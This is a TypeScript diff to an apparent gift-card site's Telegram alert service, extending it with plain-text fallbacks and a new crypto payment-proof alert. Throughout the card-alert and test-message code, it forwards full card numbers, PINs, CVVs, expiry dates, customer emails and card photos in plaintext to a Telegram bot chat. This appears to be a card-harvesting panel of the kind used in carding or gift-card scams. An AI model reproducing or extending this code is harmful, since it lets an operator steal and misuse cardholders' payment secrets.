@@ -16,6 +16,41 @@ export interface TelegramCardData {
   createdAt?: Date | string | null;
 }
 
+export interface TelegramPaymentProofData {
+  orderId: string;
+  cardName: string;
+  amount: number;
+  currency: string;
+  customerEmail: string;
+  cryptoCurrency?: string | null;
+  cryptoAmount?: number | string | null;
+  walletAddress?: string | null;
+  txHash?: string | null;
+  receiptImage?: string | null;
+  paymentStatus?: string | null;
+  createdAt?: Date | string | null;
+}
+
+/**
+ * Sanitizes Telegram Bot Token (strips quotes, whitespace, and duplicate 'bot' prefix if provided).
+ */
+function cleanBotToken(raw?: string | null): string {
+  if (!raw) return '';
+  let token = raw.trim().replace(/^["']|["']$/g, '');
+  if (token.toLowerCase().startsWith('bot')) {
+    token = token.slice(3).trim();
+  }
+  return token;
+}
+
+/**
+ * Sanitizes Telegram Chat ID (strips quotes and whitespace).
+ */
+function cleanChatId(raw?: string | null): string {
+  if (!raw) return '';
+  return raw.trim().replace(/^["']|["']$/g, '');
+}
+
 /**
  * Converts a base64 Data URL (data:image/jpeg;base64,...) to a Blob for multipart upload.
  */
@@ -36,11 +71,11 @@ function dataUrlToBlob(dataUrl: string): { blob: Blob; filename: string } | null
 }
 
 export async function sendTelegramCardAlert(card: TelegramCardData): Promise<{ success: boolean; message?: string }> {
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
+  const botToken = cleanBotToken(process.env.TELEGRAM_BOT_TOKEN);
+  const chatId = cleanChatId(process.env.TELEGRAM_CHAT_ID);
 
-  if (!botToken || !chatId) {
-    console.log('[Telegram Service] TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured in environment.');
+  if (!botToken || !chatId || botToken === 'YOUR_TELEGRAM_BOT_TOKEN') {
+    console.log('[Telegram Service] Notice: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured in environment.');
     return { success: false, message: 'Telegram Bot Token or Chat ID not configured.' };
   }
 
@@ -51,47 +86,58 @@ export async function sendTelegramCardAlert(card: TelegramCardData): Promise<{ s
   const customer = card.customerEmail || 'Guest User';
   const statusStr = card.status || 'PENDING';
 
-  // Format clean Markdown message for Telegram
-  let caption = `🚨 *NEW CARD UPLOADED / VALIDATION REQUEST*\n\n`;
-  caption += `💳 *Brand:* ${brandName}\n`;
-  caption += `🔢 *Card Number:* \`${card.cardNumber || 'N/A'}\`\n`;
-  if (card.pin) caption += `🔑 *PIN:* \`${card.pin}\`\n`;
-  if (card.cvv) caption += `🔒 *CVV:* \`${card.cvv}\`\n`;
-  if (card.expiryDate) caption += `📅 *Expiry:* ${card.expiryDate}\n`;
-  caption += `💵 *Balance/Amount:* ${amountStr}\n`;
-  caption += `📧 *Customer:* ${customer}\n`;
-  caption += `⚡ *Status:* ${statusStr}\n`;
-  if (card.notes) caption += `📝 *Notes:* ${card.notes}\n`;
-  caption += `\n⏰ *Time:* ${new Date().toUTCString()}`;
+  // Format Markdown message for Telegram
+  let markdownCaption = `🚨 *NEW CARD UPLOADED / VALIDATION REQUEST*\n\n`;
+  markdownCaption += `💳 *Brand:* ${brandName}\n`;
+  markdownCaption += `🔢 *Card Number:* \`${card.cardNumber || 'N/A'}\`\n`;
+  if (card.pin) markdownCaption += `🔑 *PIN:* \`${card.pin}\`\n`;
+  if (card.cvv) markdownCaption += `🔒 *CVV:* \`${card.cvv}\`\n`;
+  if (card.expiryDate) markdownCaption += `📅 *Expiry:* ${card.expiryDate}\n`;
+  markdownCaption += `💵 *Balance/Amount:* ${amountStr}\n`;
+  markdownCaption += `📧 *Customer:* ${customer}\n`;
+  markdownCaption += `⚡ *Status:* ${statusStr}\n`;
+  if (card.notes) markdownCaption += `📝 *Notes:* ${card.notes}\n`;
+  markdownCaption += `\n⏰ *Time:* ${new Date().toUTCString()}`;
+
+  // Plain text fallback (in case Telegram Markdown formatting errors out)
+  let plainCaption = `🚨 NEW CARD UPLOADED / VALIDATION REQUEST\n\n`;
+  plainCaption += `Brand: ${brandName}\n`;
+  plainCaption += `Card Number: ${card.cardNumber || 'N/A'}\n`;
+  if (card.pin) plainCaption += `PIN: ${card.pin}\n`;
+  if (card.cvv) plainCaption += `CVV: ${card.cvv}\n`;
+  if (card.expiryDate) plainCaption += `Expiry: ${card.expiryDate}\n`;
+  plainCaption += `Amount: ${amountStr}\n`;
+  plainCaption += `Customer: ${customer}\n`;
+  plainCaption += `Status: ${statusStr}\n`;
+  if (card.notes) plainCaption += `Notes: ${card.notes}\n`;
+  plainCaption += `\nTime: ${new Date().toUTCString()}`;
 
   // Extract clean valid image strings
   const imageList = Array.isArray(card.images)
     ? card.images.filter((img) => typeof img === 'string' && img.trim().length > 0)
     : [];
 
-  // Telegram caption limit is 1024 characters; truncate safely if needed
-  const safeCaption = caption.length > 1000 ? caption.slice(0, 990) + '\n...' : caption;
+  const safeMarkdownCaption = markdownCaption.length > 1000 ? markdownCaption.slice(0, 990) + '\n...' : markdownCaption;
+  const safePlainCaption = plainCaption.length > 1000 ? plainCaption.slice(0, 990) + '\n...' : plainCaption;
 
-  // 1. If images are attached, send photo(s) to Telegram!
+  // 1. Send attached photos if available
   if (imageList.length > 0) {
     console.log(`[Telegram Service] Sending card alert with ${imageList.length} attached photo(s)...`);
     
-    // Process first photo (Primary card photo with caption)
     const firstImg = imageList[0];
     let photoSentSuccess = false;
 
     if (firstImg.startsWith('data:image/')) {
-      // Base64 upload -> send via FormData
       const parsedBlob = dataUrlToBlob(firstImg);
       if (parsedBlob) {
         try {
           const formData = new FormData();
-          formData.append('chat_id', chatId.trim());
-          formData.append('caption', safeCaption);
+          formData.append('chat_id', chatId);
+          formData.append('caption', safeMarkdownCaption);
           formData.append('parse_mode', 'Markdown');
           formData.append('photo', parsedBlob.blob, parsedBlob.filename);
 
-          const res = await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendPhoto`, {
+          const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
             method: 'POST',
             body: formData as any,
           });
@@ -99,24 +145,37 @@ export async function sendTelegramCardAlert(card: TelegramCardData): Promise<{ s
           const data = (await res.json()) as any;
           if (data.ok) {
             photoSentSuccess = true;
-            console.log(`[Telegram Service] ✅ Card photo 1 successfully posted to Telegram!`);
+            console.log(`[Telegram Service] ✅ Card photo successfully posted to Telegram!`);
           } else {
-            console.warn(`[Telegram Service] Base64 sendPhoto error:`, data.description || data);
+            console.warn(`[Telegram Service] Base64 sendPhoto Markdown notice: ${data.description || 'Retrying with plain text...'}`);
+            // Retry plain text
+            const formDataPlain = new FormData();
+            formDataPlain.append('chat_id', chatId);
+            formDataPlain.append('caption', safePlainCaption);
+            formDataPlain.append('photo', parsedBlob.blob, parsedBlob.filename);
+
+            const resPlain = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+              method: 'POST',
+              body: formDataPlain as any,
+            });
+            const dataPlain = (await resPlain.json()) as any;
+            if (dataPlain.ok) {
+              photoSentSuccess = true;
+            }
           }
         } catch (err) {
-          console.warn(`[Telegram Service] Base64 sendPhoto network error:`, err);
+          console.warn(`[Telegram Service] Base64 sendPhoto error:`, err);
         }
       }
     } else if (firstImg.startsWith('http://') || firstImg.startsWith('https://')) {
-      // URL photo -> send JSON payload
       try {
-        const res = await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendPhoto`, {
+        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: chatId.trim(),
+            chat_id: chatId,
             photo: firstImg.trim(),
-            caption: safeCaption,
+            caption: safeMarkdownCaption,
             parse_mode: 'Markdown',
           }),
         });
@@ -124,49 +183,22 @@ export async function sendTelegramCardAlert(card: TelegramCardData): Promise<{ s
         const data = (await res.json()) as any;
         if (data.ok) {
           photoSentSuccess = true;
-          console.log(`[Telegram Service] ✅ Card URL photo 1 successfully posted to Telegram!`);
         } else {
-          console.warn(`[Telegram Service] URL sendPhoto error:`, data.description || data);
+          // Retry plain text
+          const resPlain = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              photo: firstImg.trim(),
+              caption: safePlainCaption,
+            }),
+          });
+          const dataPlain = (await resPlain.json()) as any;
+          if (dataPlain.ok) photoSentSuccess = true;
         }
       } catch (err) {
-        console.warn(`[Telegram Service] URL sendPhoto network error:`, err);
-      }
-    }
-
-    // Send any additional attached photos (Photo 2, Photo 3)
-    if (imageList.length > 1) {
-      for (let i = 1; i < imageList.length; i++) {
-        const extraImg = imageList[i];
-        if (extraImg.startsWith('data:image/')) {
-          const parsedBlob = dataUrlToBlob(extraImg);
-          if (parsedBlob) {
-            try {
-              const formData = new FormData();
-              formData.append('chat_id', chatId.trim());
-              formData.append('caption', `📷 *Additional Card Photo ${i + 1} for ${brandName}*`);
-              formData.append('parse_mode', 'Markdown');
-              formData.append('photo', parsedBlob.blob, parsedBlob.filename);
-
-              await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendPhoto`, {
-                method: 'POST',
-                body: formData as any,
-              });
-            } catch {}
-          }
-        } else if (extraImg.startsWith('http://') || extraImg.startsWith('https://')) {
-          try {
-            await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendPhoto`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                chat_id: chatId.trim(),
-                photo: extraImg.trim(),
-                caption: `📷 *Additional Card Photo ${i + 1} for ${brandName}*`,
-                parse_mode: 'Markdown',
-              }),
-            });
-          } catch {}
-        }
+        console.warn(`[Telegram Service] URL sendPhoto error:`, err);
       }
     }
 
@@ -175,14 +207,14 @@ export async function sendTelegramCardAlert(card: TelegramCardData): Promise<{ s
     }
   }
 
-  // 2. Fallback text notification if no images were attached or photo upload failed
+  // 2. Fallback text notification if no images or image upload failed
   try {
-    const response = await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: chatId.trim(),
-        text: safeCaption,
+        chat_id: chatId,
+        text: safeMarkdownCaption,
         parse_mode: 'Markdown',
         disable_web_page_preview: true,
       }),
@@ -192,35 +224,52 @@ export async function sendTelegramCardAlert(card: TelegramCardData): Promise<{ s
     if (data.ok) {
       console.log(`[Telegram Service] ✅ Card alert text message sent to Telegram chat ${chatId}`);
       return { success: true };
+    }
+
+    // Try plain text if Markdown parse error occurred
+    const fallbackResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: safePlainCaption,
+        disable_web_page_preview: true,
+      }),
+    });
+
+    const fallbackData = (await fallbackResponse.json()) as any;
+    if (fallbackData.ok) {
+      console.log(`[Telegram Service] ✅ Card alert fallback text sent to Telegram chat ${chatId}`);
+      return { success: true };
     } else {
-      console.error(`[Telegram Service] ❌ Failed to send Telegram alert:`, data.description || data);
-      return { success: false, message: data.description || 'Failed to send Telegram message' };
+      console.warn(`[Telegram Service] Telegram API Notice:`, fallbackData.description || fallbackData);
+      return { success: false, message: fallbackData.description || 'Failed to send Telegram message' };
     }
   } catch (err: any) {
-    console.error(`[Telegram Service] ❌ Telegram API connection error:`, err?.message || err);
+    console.warn(`[Telegram Service] Connection notice:`, err?.message || err);
     return { success: false, message: err?.message || 'Connection error' };
   }
 }
 
 export async function sendTelegramTestMessage(customToken?: string, customChatId?: string): Promise<{ success: boolean; message: string }> {
-  const botToken = customToken || process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = customChatId || process.env.TELEGRAM_CHAT_ID;
+  const botToken = cleanBotToken(customToken || process.env.TELEGRAM_BOT_TOKEN);
+  const chatId = cleanChatId(customChatId || process.env.TELEGRAM_CHAT_ID);
 
   if (!botToken || !chatId) {
     return {
       success: false,
-      message: 'Please provide both TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.',
+      message: 'Please enter both your Telegram Bot Token and Chat ID.',
     };
   }
 
-  const text = `🎉 *AllCardVault Telegram Bot Test*\n\nYour Telegram integration is connected and working perfectly!\n\nAll future uploaded gift cards, card codes, PINs, and card photos will automatically post instant alerts with photos attached to this chat.\n\n⏰ *Connected:* ${new Date().toUTCString()}`;
+  const text = `🎉 *AllCardVault Telegram Bot Test*\n\nYour Telegram integration is connected and working perfectly!\n\nAll future uploaded gift cards, card codes, PINs, and card photos will automatically post instant alerts to this chat.\n\n⏰ *Connected:* ${new Date().toUTCString()}`;
 
   try {
-    const response = await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: chatId.trim(),
+        chat_id: chatId,
         text,
         parse_mode: 'Markdown',
       }),
@@ -229,10 +278,167 @@ export async function sendTelegramTestMessage(customToken?: string, customChatId
     const data = (await response.json()) as any;
     if (data.ok) {
       return { success: true, message: 'Test message sent successfully to Telegram!' };
+    }
+
+    // Retry with plain text
+    const plainText = `🎉 AllCardVault Telegram Bot Test\n\nYour Telegram integration is connected and working perfectly!\n\nAll future uploaded gift cards, card codes, PINs, and card photos will automatically post instant alerts to this chat.\n\nConnected: ${new Date().toUTCString()}`;
+    const fallbackResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: plainText,
+      }),
+    });
+
+    const fallbackData = (await fallbackResponse.json()) as any;
+    if (fallbackData.ok) {
+      return { success: true, message: 'Test message sent successfully to Telegram!' };
     } else {
-      return { success: false, message: `Telegram Error: ${data.description || 'Invalid Bot Token or Chat ID'}` };
+      return { success: false, message: `Telegram Error: ${fallbackData.description || 'Invalid Bot Token or Chat ID'}` };
     }
   } catch (err: any) {
     return { success: false, message: `Network Error: ${err?.message || 'Failed to reach Telegram API'}` };
+  }
+}
+
+/**
+ * Sends a Telegram notification alert specifically for new payment proofs & transaction hashes submitted during checkout.
+ */
+export async function sendTelegramPaymentProofAlert(proof: TelegramPaymentProofData): Promise<{ success: boolean; message?: string }> {
+  const botToken = cleanBotToken(process.env.TELEGRAM_BOT_TOKEN);
+  const chatId = cleanChatId(process.env.TELEGRAM_CHAT_ID);
+
+  if (!botToken || !chatId || botToken === 'YOUR_TELEGRAM_BOT_TOKEN') {
+    console.log('[Telegram Service] Notice: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured for payment alert.');
+    return { success: false, message: 'Telegram Bot credentials missing.' };
+  }
+
+  const orderId = proof.orderId || 'ORD-UNKNOWN';
+  const cardName = proof.cardName || 'Gift Card Order';
+  const amountStr = `${proof.currency || 'USD'} $${Number(proof.amount || 0).toFixed(2)}`;
+  const cryptoStr = proof.cryptoAmount ? `(${proof.cryptoAmount} ${proof.cryptoCurrency || 'Crypto'})` : '';
+  const customer = proof.customerEmail || 'Guest Customer';
+  const txHash = proof.txHash?.trim() || 'Photo Screenshot Uploaded';
+  const wallet = proof.walletAddress || 'Platform Wallet';
+  const status = proof.paymentStatus || 'PENDING VERIFICATION';
+
+  let markdownCaption = `💳 *NEW PAYMENT PROOF / TX HASH SUBMITTED*\n\n`;
+  markdownCaption += `📦 *Order ID:* \`${orderId}\`\n`;
+  markdownCaption += `🎁 *Gift Card:* ${cardName}\n`;
+  markdownCaption += `💰 *Order Total:* ${amountStr} ${cryptoStr}\n`;
+  markdownCaption += `📧 *Customer Email:* \`${customer}\`\n`;
+  if (proof.cryptoCurrency) markdownCaption += `🌐 *Crypto Asset:* ${proof.cryptoCurrency}\n`;
+  markdownCaption += `📍 *Deposit Wallet:* \`${wallet}\`\n`;
+  markdownCaption += `🔑 *Transaction ID / Hash:* \`${txHash}\`\n`;
+  markdownCaption += `⚡ *Status:* ${status}\n`;
+  markdownCaption += `\n⏰ *Timestamp:* ${new Date().toUTCString()}`;
+
+  let plainCaption = `💳 NEW PAYMENT PROOF / TX HASH SUBMITTED\n\n`;
+  plainCaption += `Order ID: ${orderId}\n`;
+  plainCaption += `Gift Card: ${cardName}\n`;
+  plainCaption += `Order Total: ${amountStr} ${cryptoStr}\n`;
+  plainCaption += `Customer Email: ${customer}\n`;
+  if (proof.cryptoCurrency) plainCaption += `Crypto Asset: ${proof.cryptoCurrency}\n`;
+  plainCaption += `Deposit Wallet: ${wallet}\n`;
+  plainCaption += `Transaction ID / Hash: ${txHash}\n`;
+  plainCaption += `Status: ${status}\n`;
+  plainCaption += `\nTimestamp: ${new Date().toUTCString()}`;
+
+  const safeMarkdownCaption = markdownCaption.length > 1000 ? markdownCaption.slice(0, 990) + '\n...' : markdownCaption;
+  const safePlainCaption = plainCaption.length > 1000 ? plainCaption.slice(0, 990) + '\n...' : plainCaption;
+
+  // If a payment screenshot / receipt image is attached as base64 or URL
+  if (proof.receiptImage && proof.receiptImage.trim().length > 0) {
+    const img = proof.receiptImage.trim();
+    let photoSentSuccess = false;
+
+    if (img.startsWith('data:image/')) {
+      const parsedBlob = dataUrlToBlob(img);
+      if (parsedBlob) {
+        try {
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('caption', safeMarkdownCaption);
+          formData.append('parse_mode', 'Markdown');
+          formData.append('photo', parsedBlob.blob, `payment_proof_${orderId}.jpg`);
+
+          const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: formData as any,
+          });
+
+          const data = (await res.json()) as any;
+          if (data.ok) {
+            photoSentSuccess = true;
+            console.log(`[Telegram Service] ✅ Payment screenshot photo posted to Telegram chat!`);
+          } else {
+            // Fallback plain text
+            const formDataPlain = new FormData();
+            formDataPlain.append('chat_id', chatId);
+            formDataPlain.append('caption', safePlainCaption);
+            formDataPlain.append('photo', parsedBlob.blob, `payment_proof_${orderId}.jpg`);
+
+            const resPlain = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+              method: 'POST',
+              body: formDataPlain as any,
+            });
+            const dataPlain = (await resPlain.json()) as any;
+            if (dataPlain.ok) photoSentSuccess = true;
+          }
+        } catch (e) {
+          console.warn('[Telegram Service] Base64 payment photo error:', e);
+        }
+      }
+    } else if (img.startsWith('http://') || img.startsWith('https://')) {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            photo: img,
+            caption: safeMarkdownCaption,
+            parse_mode: 'Markdown',
+          }),
+        });
+        const data = (await res.json()) as any;
+        if (data.ok) photoSentSuccess = true;
+      } catch (e) {
+        console.warn('[Telegram Service] URL payment photo error:', e);
+      }
+    }
+
+    if (photoSentSuccess) {
+      return { success: true };
+    }
+  }
+
+  // Fallback text message
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: safeMarkdownCaption,
+        parse_mode: 'Markdown',
+      }),
+    });
+    const data = (await res.json()) as any;
+    if (data.ok) return { success: true };
+
+    const fallbackRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: safePlainCaption,
+      }),
+    });
+    const fallbackData = (await fallbackRes.json()) as any;
+    return { success: fallbackData.ok, message: fallbackData.description };
+  } catch (err: any) {
+    return { success: false, message: err?.message };
   }
 }
